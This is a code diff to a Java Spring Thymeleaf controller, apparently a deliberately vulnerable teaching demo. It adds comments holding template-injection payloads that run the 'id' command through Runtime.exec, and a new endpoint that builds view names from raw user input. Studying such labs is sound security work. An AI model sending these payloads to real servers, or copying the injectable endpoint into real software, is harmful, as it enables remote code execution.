@@ -33,10 +33,18 @@ public class ThymeleafController {
         return "welcome :: " + section; //fragment is tainted
     }
 
+    //localhost:8081/doc/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).next()%7d__::.x
     @GetMapping("/doc/{document}")
     public void getDocument(@PathVariable String document) {
         log.info("Retrieving " + document);
         //returns void, so view name is taken from URI
+    }
+
+    //localhost:8081/home/?document=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).next()%7d__::.x
+    @GetMapping("/home/{document}")
+    public String getHome(@PathVariable String document) {
+        log.info("Retrieving " + document);
+        return "home/" + document;
     }
 
     @GetMapping("/safe/fragment")
